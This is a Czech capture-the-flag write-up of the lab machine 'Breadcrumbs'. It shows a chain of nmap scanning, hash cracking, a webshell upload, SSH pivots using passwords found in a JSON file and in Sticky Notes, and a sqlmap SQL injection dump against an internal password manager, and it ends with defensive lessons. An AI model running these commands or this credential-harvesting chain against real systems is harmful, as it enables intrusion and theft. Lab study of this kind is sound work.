---
layout: post
author: Tomáš Matějíček
title: "Breadcrumbs"
date: 2020-11-12
tags: windows sql-injection smb ssh php
---
## Úvod a kontext

Breadcrumbs je typický příklad řetězce z malých, zdánlivě nesouvisejících stop. Webový portál dovolí upload a práci se session tokenem, v lokálních datech pak leží JSON objednávky s dalším heslem a Sticky Notes doplní přístup k internímu účtu `development`. Těžiště článku tedy neleží jen ve webu, ale i v tom, jak velkou hodnotu mají obyčejné lokální artefakty po prvním shellu.

Nejdůležitější je právě návaznost jednotlivých pivotů. Útok nejde přímo z webu na `Administrator`, ale přes `www-data`, `juliette`, `development` a teprve potom na interní `passmanager.htb`, kde leží finální tajemství pro administrátorský účet. Obecněji tenhle vzorec rozebírám i v článcích [Klientské, desktopové a ne-textové artefakty po footholdu](/techniky/klientske-desktopove-a-ne-textove-artefakty-po-footholdu) a [Lokálně dostupné služby po footholdu: localhost není boundary](/techniky/lokalne-dostupne-sluzby-po-footholdu-localhost-neni-boundary).

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.

Praktický základ prvního skenu rozebírám i v článku [Nmap](/nastroje/nmap).
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
[... výstup zkrácen ...]
|   date: 2021-03-23T20:35:20
|_  start_date: N/A

http://10.10.10.228/portal/php/
http://10.10.10.228/portal/php/admins.php
http://10.10.10.228/portal/php/users.php
http://10.10.10.228/portal/composer.json
http://10.10.10.228/portal/composer.lock
http://10.10.10.228/portal/vendor/composer/installed.json
http://10.10.10.228/portal/uploads/
```

## Analýza zjištění

### Crack hesel z portálu

Dump uživatelských hashů z portálu má smysl právě proto, že může otevřít další účet nebo potvrdit heslové vzorce v prostředí. Tady byl nejdůležitější účet `juliette`, který se později objeví i v lokálních datech.
```text
john	__CENSORED__
```
```
emma	__CENSORED__
william	__CENSORED__
lucas	__CENSORED__
sirine	__CENSORED__
juliette	__CENSORED__
support	__CENSORED__
```

### Ověření slabých hesel

`hashcat` tady neřeší finální root, ale připravuje další mezikroky. V prostředí s více uživateli je důležité vědět, které účty mají slabší hesla a kde se může vyplatit další pivot. Praktickou stránku offline crackingu rozebírám i v článku [Hashcat](/nastroje/hashcat).
```bash
hashcat -m100 -a 0 hashes /usr/share/wordlists/rockyou.txt
```

## Získání přístupu

### Upload webshellu a účet `www-data`

První vstup vedl přes upload do portálu s platným session/JWT tokenem. Webshell potom odhalil lokální AutoLogon údaje a ty dovolily přepnout se na `www-data` přes SSH, místo aby se celý další průzkum dělal v křehkém webovém procesu.
```bash
ssh www-data@$IP
```
```
PS C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData> cat .\juliette.json
{
        "pizza" : "margherita",
        "size" : "large",
        "drink" : "water",
        "card" : "VISA",
        "PIN" : "9890",
        "alternate" : {
                "username" : "juliette",
                "password" : "jUli901./())!",
        }
}
```

### Přechod na `juliette`

V `pizzaDeliveryUserData` leží soubory jednotlivých uživatelů. `juliette.json` je cenný právě proto, že obsahuje alternativní heslo, které otevře další účet bez potřeby další exploitační chyby.
```bash
ssh juliette@$IP
```
```
gc C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite* .
```

### Získání user flagu

Sticky Notes v `plum.sqlite` doplnily ještě heslo k účtu `development`. To je důležitý mezikrok, protože právě `development` vidí interní službu `passmanager.htb` na portu `1234`. Přesně tady se ukazuje, že lokální uživatelská data bývají cennější než další webová enumerace.

```text
ssh development@$IP
fN3)sN5Ee@g
```

## Eskalace oprávnění

### Získání root flagu

Root část začíná až u interního `passmanager.htb`. Po přesměrování portu `1234` se ukáže SQL injection v parametru `method`, ze které jde vytáhnout AES klíč i šifrované heslo administrátora. Po dešifrování vznikne přístup pro účet `Administrator`, který už otevře `root.txt` přímo. Je to přesně ta situace, kdy localhost bind není obrana, ale jen odložená druhá útoková plocha.
```bash
ssh -N -L 1234:127.0.0.1:1234 development@10.10.10.228
sqlmap --dump -u "http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords"
ssh administrator@10.10.10.228
more root.txt
```
```
__CENSORED__
```

## Shrnutí klíčových poznatků

- První foothold stál na uploadu do portálu a přechodu z webshellu na stabilní účet `www-data`.
- Další posun otevřely lokální artefakty: `juliette.json` s heslem a Sticky Notes `plum.sqlite`, které přidaly účet `development`.
- Root nevznikl lokálním exploitem, ale až po pivotu na interní `passmanager.htb`, SQL injection a dešifrování hesla pro `Administrator`.

## Co si odnést do praxe

- Uploady v interních portálech musí být přísně omezené a session tokeny správně vázané na roli a akci. Jakmile portál dovolí nahrát vlastní soubor, webová vrstva se mění v přímý shell.
- Uživatelské artefakty jako JSON objednávky nebo databáze Sticky Notes nejsou nevinná metadata. V praxi často obsahují přesně ta hesla, která propojí několik oddělených účtů do jednoho útočného řetězce.
- Interní služby za localhostem nejsou bezpečné samy o sobě. Pokud se k nim dá dopivotovat přes běžný účet a obsahují SQL injection nebo vlastní šifrovací logiku, skončí jako finální zdroj privilegovaných tajemství.
